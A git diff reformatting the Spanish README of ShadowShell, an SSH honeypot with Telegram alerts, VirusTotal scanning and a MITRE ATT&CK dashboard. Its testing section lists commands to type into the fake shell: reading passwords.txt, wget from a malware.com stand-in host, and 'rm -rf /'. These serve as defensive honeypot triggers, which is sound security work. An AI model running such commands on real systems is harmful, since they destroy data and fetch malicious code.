@@ -25,22 +25,22 @@ A diferencia de un honeypot simple, **ShadowShell** integra inteligencia de amen
 - **Monitor de Credenciales:** Registro de usuarios y contraseñas utilizados en intentos de fuerza bruta.
 
 ### 📊 Visualización & Alertas
-- **📱 Alertas en Tiempo Real:** Notificaciones instantáneas a **Telegram** con detalles del intruso (IP, Comando, Resultado VT).
-- **📈 Dashboard Forense (Streamlit):**
-  - **Mapa Mundial de Amenazas** en tiempo real.
-  - **Matriz MITRE ATT&CK** interactiva.
-  - **Gráficos de Distribución** por ISP y Organización.
-  - **Logs detallados** con filtros forenses.
+- **📱 Alertas en Tiempo Real:** Notificaciones instantáneas a **Telegram** con detalles del intruso (IP, Comando, Resultado VT).  
+- **📈 Dashboard Forense (Streamlit):**  
+  - **Mapa Mundial de Amenazas** en tiempo real.  
+  - **Matriz MITRE ATT&CK** interactiva.  
+  - **Gráficos de Distribución** por ISP y Organización.  
+  - **Logs detallados** con filtros forenses.  
 
-### 🐳 Despliegue
-- **Dockerized:** Listo para desplegar en cualquier entorno con un solo comando.
-- **Persistencia:** Base de datos SQLite ligera y rápida.
+### 🐳 Despliegue  
+- **Dockerized:** Listo para desplegar en cualquier entorno con un solo comando.  
+- **Persistencia:** Base de datos SQLite ligera y rápida.  
 
 ---
 
-## 🏗️ Arquitectura del Sistema
+## 🏗️ Arquitectura del Sistema  
 
-```mermaid
+```mermaid  
 graph TD
     A[Atacante / Bot] -->|SSH Port 2222| B(Server.py - Paramiko)
     B -->|Logs & Sesiones| C[(SQLite Database)]
@@ -50,57 +50,70 @@ graph TD
     F -->|Clasificación| G[MITRE ATT&CK Logic]
     F -->|Geolocalización| H[IP-API]
 ```
-### 🛠️ Instalación y Uso
-Prerrequisitos
+### 🛠️ Instalación y Uso  
+Prerrequisitos  
+```bash
 Docker & Docker Compose (Recomendado)
 
 O Python 3.9+ si se corre localmente.
-
+```
+```bash
 - ✅ Paso 1: Clonar el repositorio
 git clone [https://github.com/punga1078/ShadowShell](https://github.com/punga1078/ShadowShell)
 cd ShadowShell
+```
+``` bash
 - ✅ Paso 2: Configurar Variables de Entorno
 Crea un archivo .env en la raíz del proyecto y agrega tus claves:
 TELEGRAM_TOKEN=tu_token_de_telegram
 TELEGRAM_CHAT_ID=tu_chat_id
 VT_API_KEY=tu_api_key_de_virustotal
+```
+#### 🚀 Ejecutar el contenedor:  
+Mapea el puerto 2222 (SSH) y 8501 (Dashboard)  
+docker run -p 2222:2222 -p 8501:8501 --env-file .env shadowshell  
 
-Ejecutar el contenedor:
-# Mapea el puerto 2222 (SSH) y 8501 (Dashboard)
-docker run -p 2222:2222 -p 8501:8501 --env-file .env shadowshell
-
-🕹️ Cómo Probarlo (Simulación de Ataque)
+### 🕹️ Cómo Probarlo (Simulación de Ataque)
 Una vez que el contenedor esté corriendo:
 
-Acceder al Dashboard: Abre tu navegador en http://localhost:8501.
+Acceder al Dashboard: Abre tu navegador en http://localhost:8501.  
 
-Lanzar un Ataque Simulado: Desde otra terminal, conéctate a tu propio honeypot:
-ssh root@localhost -p 2222
-(Cualquier contraseña es válida)
+Lanzar un Ataque Simulado: Desde otra terminal, conéctate a tu propio honeypot:   
+ssh root@localhost -p 2222  
+(Cualquier contraseña es válida)  
 
 Ejecutar Comandos Maliciosos: Dentro de la shell falsa, prueba estos comandos para ver las alertas:
-ls -la                        # Táctica: Discovery
-cat passwords.txt             # Alerta IDS: Robo de Datos
-wget [http://malware.com/virus](http://malware.com/virus) # Alerta VT + Táctica: Resource Dev
-rm -rf /                      # Táctica: Defense Evasion
 
-📂 Estructura del Proyecto
-ShadowShell/
-├── DATA/               # Persistencia (DB y Logs)
-├── SRC/
-│   ├── logger.py       # Gestión de base de datos SQLite
-│   ├── notifier.py     # Sistema de alertas Telegram
-│   ├── shell_emulator.py # Simulación de terminal Linux
-│   └── vt_scanner.py   # Integración con VirusTotal
-├── server.py           # Servidor SSH (Core)
-├── dashboard.py        # Interfaz de Inteligencia (Streamlit)
-├── Dockerfile          # Configuración de imagen Docker
-├── requirements.txt    # Dependencias de Python
-└── .env                # Credenciales (No subir al repo)
+   ```bash
+   # 1. Táctica: Discovery (Reconocimiento)
+   ls -la
 
-⚠️ Disclaimer
-Este software ha sido desarrollado únicamente con fines educativos y de investigación académica.
+   # 2. Alerta IDS: Robo de Datos (Honeyfile trigger)
+   cat passwords.txt
 
-El autor no se hace responsable del uso indebido de esta herramienta.
+   # 3. Alerta VirusTotal + Táctica: Resource Development
+   wget [http://malware.com/virus](http://malware.com/virus)
 
-Se recomienda desplegar este sistema en entornos controlados, aislados o en servidores VPS dedicados para evitar riesgos de seguridad en redes personales.
+   # 4. Táctica: Defense Evasion (Borrado de huellas)
+   rm -rf /
+ ```
+
+📂ShadowShell/  
+├── 📂DATA/               # Persistencia (Base de datos SQLite y Logs)  
+├── 📂SRC/  
+│   ├── logger.py       # Gestión de logs y base de datos  
+│   ├── notifier.py     # Sistema de alertas a Telegram  
+│   ├── shell_emulator.py # Simulación de terminal Linux y Honeyfiles  
+│   └── vt_scanner.py   # Integración con VirusTotal API  
+├── server.py           # Servidor SSH Principal (Core)  
+├── dashboard.py        # Interfaz de Inteligencia (Streamlit)  
+├── Dockerfile          # Configuración de imagen Docker  
+├── requirements.txt    # Dependencias de Python  
+└── .env                # Credenciales   
+
+⚠️ Disclaimer  
+Este software ha sido desarrollado únicamente con fines educativos y de investigación académica.  
+
+El autor no se hace responsable del uso indebido de esta herramienta.  
+
+Se recomienda desplegar este sistema en entornos controlados, aislados o en servidores VPS dedicados para evitar riesgos de seguridad en redes personales.  
